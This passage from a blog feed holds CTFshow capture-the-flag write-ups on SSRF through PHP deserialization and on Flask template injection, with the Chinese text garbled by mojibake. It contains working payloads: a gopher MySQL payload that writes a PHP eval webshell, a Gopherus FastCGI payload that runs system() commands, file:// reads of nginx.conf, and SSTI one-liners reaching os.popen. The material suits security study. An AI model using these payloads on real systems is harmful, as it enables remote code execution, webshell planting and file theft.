class="comment">//TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjA6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDUlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlMDElMDAlMDAlMDAlMDEiO319</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694930006097-a4bea450-bf23-4cf0-9c25-36c2a0e97031.png" alt="image.png"><br>çˆ†ç ´è¿›å»ã€‚<br>ç„¶åå†index.phpé¡µé¢cookieä¸­ä¼ å…¥serviceä¸­ä¼ å…¥éœ€è¦çš„payloadå³å¯ã€‚<br>ç„¶åè®¿é—®1.phpä¼ å‚è·å–flagå³å¯ã€‚</p><h1 id="web309"><a href="#web309" class="headerlink" title="web309"></a>web309</h1><h3 id="SSRFæ‰“fastcgi"><a href="#SSRFæ‰“fastcgi" class="headerlink" title="SSRFæ‰“fastcgi"></a>SSRFæ‰“fastcgi</h3><p>è¿™æ ¹æœ¬ä¸ä¼šï¼Œç›´æ¥è¶…wp</p><blockquote><p>åœ¨é™æ€ç½‘ç«™ä¸­ï¼ŒWEB å®¹å™¨å¦‚ Apacheã€Nginx ç›¸å½“äºå†…å®¹åˆ†å‘å‘˜çš„è§’è‰²ï¼Œ æ ¹æ®ç”¨æˆ·è¯·æ±‚çš„é¡µé¢ä»ç½‘ç«™æ ¹ç›®å½•ä¸­è¿”å›ç»™ç”¨æˆ·ï¼›è€Œåœ¨åŠ¨æ€ç½‘ç«™ä¸­ï¼ŒWEB å®¹å™¨ä¾‹å¦‚ Apache ä¼šæ ¹æ®ç”¨æˆ·çš„è¯·æ±‚è¿›è¡Œç®€å•å¤„ç†åäº¤ç»™ php è§£é‡Šå™¨ï¼›å½“ Apache æ”¶åˆ°ç”¨æˆ·å¯¹ index.php çš„è¯·æ±‚åï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯ CGIï¼Œä¼šå¯åŠ¨å¯¹åº”çš„ CGI ç¨‹åºï¼Œå¯¹åº”åœ¨è¿™é‡Œå°±æ˜¯ PHP çš„è§£æå™¨ã€‚æ¥ä¸‹æ¥ PHP è§£æå™¨ä¼šè§£æ php.ini æ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥è§„å®š CGI è§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ï¼ŒWeb server å†æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚è¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„åŠ¨æ€ PHP Web è®¿é—®æµç¨‹<br>è¿™é‡Œè¯´çš„æ˜¯ä½¿ç”¨ CGIï¼Œè€Œ FastCGI å°±ç›¸å½“äºé«˜æ€§èƒ½çš„ CGIï¼Œä¸ CGI ä¸åŒçš„æ˜¯å®ƒåƒä¸€ä¸ªå¸¸é©»çš„ CGIï¼Œåœ¨å¯åŠ¨åä¼šä¸€ç›´è¿è¡Œç€ï¼Œä¸éœ€è¦æ¯æ¬¡å¤„ç†æ•°æ®æ—¶éƒ½å¯åŠ¨ä¸€æ¬¡ï¼Œ æ‰€ä»¥è¿™é‡Œå¼•å‡ºä¸‹é¢è¿™å¥æ¦‚å¿µï¼ŒFastCGI æ˜¯è¯­è¨€æ— å…³çš„ã€å¯ä¼¸ç¼©æ¶æ„çš„ CGI å¼€æ”¾æ‰©å±•ï¼Œå…¶ä¸»è¦è¡Œä¸ºæ˜¯å°† CGI è§£é‡Šå™¨è¿›ç¨‹ä¿æŒåœ¨å†…å­˜ä¸­ï¼Œå¹¶å› æ­¤è·å¾—è¾ƒé«˜çš„æ€§èƒ½</p></blockquote><blockquote><p>æ¢æµ‹æ˜¯é€šè¿‡gopheråè®®çš„å»¶è¿Ÿåˆ¤æ–­çš„<br>gopher://127.0.0.1:9000<br>é€šè¿‡httpæˆ–å…¶ä»–åè®®å»æ¢æµ‹å†…ç½‘ï¼Œå¦‚æœipå­˜æ´»åˆ™çŸ­å»¶è¿Ÿ(ä¸ç®¡ç«¯å£å¼€æ²¡å¼€)ï¼Œå¦‚æœipä¸å­˜åœ¨åˆ™é•¿å»¶è¿Ÿ</p></blockquote><p>php-fpm</p><blockquote><p>åœ¨é™æ€ç½‘ç«™ä¸­ï¼ŒWEB å®¹å™¨å¦‚ Apacheã€Nginx ç›¸å½“äºå†…å®¹åˆ†å‘å‘˜çš„è§’è‰²ï¼Œ æ ¹æ®ç”¨æˆ·è¯·æ±‚çš„é¡µé¢ä»ç½‘ç«™æ ¹ç›®å½•ä¸­è¿”å›ç»™ç”¨æˆ·ï¼›è€Œåœ¨åŠ¨æ€ç½‘ç«™ä¸­ï¼ŒWEB å®¹å™¨ä¾‹å¦‚ Apache ä¼šæ ¹æ®ç”¨æˆ·çš„è¯·æ±‚è¿›è¡Œç®€å•å¤„ç†åäº¤ç»™ php è§£é‡Šå™¨ï¼›å½“ Apache æ”¶åˆ°ç”¨æˆ·å¯¹ index.php çš„è¯·æ±‚åï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯ CGIï¼Œä¼šå¯åŠ¨å¯¹åº”çš„ CGI ç¨‹åºï¼Œå¯¹åº”åœ¨è¿™é‡Œå°±æ˜¯ PHP çš„è§£æå™¨ã€‚æ¥ä¸‹æ¥ PHP è§£æå™¨ä¼šè§£æ php.ini æ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥è§„å®š CGI è§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ï¼ŒWeb server å†æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚è¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„åŠ¨æ€ PHP Web è®¿é—®æµç¨‹</p><p>è¿™é‡Œè¯´çš„æ˜¯ä½¿ç”¨ CGIï¼Œè€Œ FastCGI å°±ç›¸å½“äºé«˜æ€§èƒ½çš„ CGIï¼Œä¸ CGI ä¸åŒçš„æ˜¯å®ƒåƒä¸€ä¸ªå¸¸é©»çš„ CGIï¼Œåœ¨å¯åŠ¨åä¼šä¸€ç›´è¿è¡Œç€ï¼Œä¸éœ€è¦æ¯æ¬¡å¤„ç†æ•°æ®æ—¶éƒ½å¯åŠ¨ä¸€æ¬¡ï¼Œ æ‰€ä»¥è¿™é‡Œå¼•å‡ºä¸‹é¢è¿™å¥æ¦‚å¿µï¼ŒFastCGI æ˜¯è¯­è¨€æ— å…³çš„ã€å¯ä¼¸ç¼©æ¶æ„çš„ CGI å¼€æ”¾æ‰©å±•ï¼Œå…¶ä¸»è¦è¡Œä¸ºæ˜¯å°† CGI è§£é‡Šå™¨è¿›ç¨‹ä¿æŒåœ¨å†…å­˜ä¸­ï¼Œå¹¶å› æ­¤è·å¾—è¾ƒé«˜çš„æ€§èƒ½</p></blockquote><p>å‡è®¾åœ¨é…ç½®fpmæ—¶ï¼Œå°†ç›‘å¬çš„åœ°å€è®¾ä¸ºäº†0.0.0.0:9000ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿphp-fpmæœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ­¤æ—¶æ”»å‡»è€…å¯ä»¥æ— éœ€åˆ©ç”¨SSRFä»æœåŠ¡å™¨æœ¬åœ°è®¿é—®çš„ç‰¹æ€§ï¼Œç›´æ¥ä¸æœåŠ¡å™¨9000ç«¯å£ä¸Šçš„php-fpmè¿›è¡Œé€šä¿¡ï¼Œè¿›è€Œå¯ä»¥ç”¨fcgi_expç­‰å·¥å…·å»æ”»å‡»æœåŠ¡å™¨ä¸Šçš„php-fpmå®ç°ä»»æ„ä»£ç æ‰§è¡Œ<br>è¿˜æ˜¯gopherusè¿™ä¸ªå·¥å…·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Give one file name which should be surely present in the <span class="title function_ invoke__">server</span> (prefer .php file)</span><br><span class="line"><span class="keyword">if</span> you don<span class="string">&#x27;t know press ENTER we have default one:  index.php</span></span><br><span class="line"><span class="string">Terminal command to run:  cat /var/www/html/f* &gt; flag.txt</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694931120245-d9009d25-d5ae-46ed-8b4d-88f63969465b.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:<span class="comment">//127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH83%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00S%04%00%3C%3Fphp%20system%28%27cat%20/var/www/html/f%2A%20%3E%20flag.txt%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932814438-81db3baf-612d-4ee1-a108-834406771f26.png" alt="image.png"></p><h1 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h1><h3 id="SSRFè¯»æ–‡ä»¶"><a href="#SSRFè¯»æ–‡ä»¶" class="headerlink" title="SSRFè¯»æ–‡ä»¶"></a>SSRFè¯»æ–‡ä»¶</h3><p>admin-admin1<br>ä¼ªåè®®è¯»nginx.conf:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;file:///etc/nginx/nginx.conf&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment"># TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyODoiZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZiI7fX0=</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932331570-e41b1877-b7a5-4e2f-8362-9700d2a562af.png" alt="image.png">æ¯ä¸€ä¸ªhttpå—éƒ½å¯ä»¥åŒ…å«å¤šä¸ªserverå—ï¼Œè€Œæ¯ä¸ªserverå—å°±ç›¸å½“äºä¸€å°è™šæ‹Ÿä¸»æœºï¼Œå®ƒå†…éƒ¨å¯æœ‰å¤šå°ä¸»æœºè”åˆæä¾›æœåŠ¡ï¼Œä¸€èµ·å¯¹å¤–æä¾›åœ¨é€»è¾‘ä¸Šå…³ç³»å¯†åˆ‡çš„ä¸€ç»„æœåŠ¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       <span class="number">4476</span>;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        root         /<span class="keyword">var</span>/flag;</span><br><span class="line">        index index.html;</span><br><span class="line"></span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">        proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;http://127.0.0.1:4476&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment"># TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyMToiaHR0cDovLzEyNy4wLjAuMTo0NDc2Ijt9fQ==</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932555604-4cbee450-6891-43ef-8b0b-141cacb63afb.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web361-web372SSTIç¯‡</title>
      <link href="/2023/09/17/web361-web372SSTI%E7%AF%87/"/>
      <url>/2023/09/17/web361-web372SSTI%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸­æ‰€æœ‰{ {ã€{ %ï¼Œå…¶ä½™åŒç†ä¸­æœ¬æ¥åº”è¯¥æ²¡æœ‰ç©ºæ ¼ï¼Œä½†æ˜¯ç”±äºä¸Nunjunksè¯­æ³•ç¢°æ’ï¼Œå› æ­¤ä¿®æ”¹ã€‚</p><blockquote><p><a href="https://blog.csdn.net/q20010619/article/details/120493997">https://blog.csdn.net/q20010619/article/details/120493997</a></p></blockquote><h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690099738699-84cc7144-2cf6-458f-9d0b-4c39ad5e29f5.png" alt="image.png"></h1><p>ä»£ç å—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å˜é‡å— &#123; &#123;&#125; &#125;ç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º</span><br><span class="line">æ³¨é‡Šå— &#123;<span class="comment">##&#125;æ³¨é‡Š</span></span><br><span class="line">æ§åˆ¶å—&#123; %% &#125;å¯ä»¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œè¯­å¥</span><br><span class="line">è¡Œå£°æ˜<span class="comment">##å¯ä»¥æœ‰å’Œ&#123; %% &#125;ç›¸åŒçš„æ•ˆæœ</span></span><br></pre></td></tr></table></figure><p>å¸¸ç”¨æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__class__           æŸ¥çœ‹å¯¹è±¡æ‰€åœ¨çš„ç±»</span><br><span class="line">__mro__             æŸ¥çœ‹ç»§æ‰¿å…³ç³»å’Œè°ƒç”¨é¡ºåºï¼Œè¿”å›å…ƒç»„</span><br><span class="line">__base__            è¿”å›åŸºç±»</span><br><span class="line">__bases__           è¿”å›åŸºç±»å…ƒç»„</span><br><span class="line">__subclasses__()    è¿”å›å­ç±»åˆ—è¡¨</span><br><span class="line">__init__            è°ƒç”¨åˆå§‹åŒ–å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥è·³åˆ°__globals__</span><br><span class="line">__globals__         è¿”å›å‡½æ•°æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´æ‰€å®šä¹‰çš„å…¨å±€å˜é‡ï¼Œè¿”å›å­—å…¸</span><br><span class="line">__builtins__        è¿”å›å†…å»ºå†…å»ºåç§°ç©ºé—´å­—å…¸</span><br><span class="line">__dic__              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ</span><br><span class="line">__getattribute__()   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚:a.xxx/a.xxx()ï¼‰éƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚</span><br><span class="line">__getitem__()        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a[<span class="string">&#x27;b&#x27;</span>]ï¼Œå°±æ˜¯a.__getitem__(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚</span><br><span class="line"><span class="built_in">__import__</span>           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line">__str__()            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚</span><br><span class="line">url_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]å«æœ‰current_app</span><br><span class="line">get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]å«æœ‰current_app</span><br><span class="line">lipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š&#123; &#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125; &#125;</span><br><span class="line">&#123; &#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125; &#125;</span><br><span class="line">current_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡</span><br><span class="line">request              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–<span class="built_in">open</span>å‡½æ•°:request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1    getä¼ å‚</span><br><span class="line">request.values.x1  æ‰€æœ‰å‚æ•°</span><br><span class="line">request.cookies      cookieså‚æ•°</span><br><span class="line">request.headers      è¯·æ±‚å¤´å‚æ•°</span><br><span class="line">request.form.x1    postä¼ å‚(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)</span><br><span class="line">request.data   postä¼ å‚(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json postä¼ json  (Content-<span class="type">Type</span>: application/json)</span><br><span class="line">config               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·&#123; &#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125; &#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤å™¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>()å°†å€¼è½¬æ¢ä¸º<span class="built_in">int</span>ç±»å‹ï¼›</span><br><span class="line"></span><br><span class="line"><span class="built_in">float</span>()å°†å€¼è½¬æ¢ä¸º<span class="built_in">float</span>ç±»å‹ï¼›</span><br><span class="line"></span><br><span class="line">lower()å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›</span><br><span class="line"></span><br><span class="line">upper()å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›</span><br><span class="line"></span><br><span class="line">title()æŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›</span><br><span class="line"></span><br><span class="line">capitalize()æŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›</span><br><span class="line"></span><br><span class="line">trim()æˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›</span><br><span class="line"></span><br><span class="line">wordcount()è®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›</span><br><span class="line"></span><br><span class="line">reverse()å­—ç¬¦ä¸²åè½¬ï¼›</span><br><span class="line"></span><br><span class="line">replace(value,old,new)æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">truncate(value,length=<span class="number">255</span>,killwords=<span class="literal">False</span>)æˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">striptags()åˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›</span><br><span class="line"></span><br><span 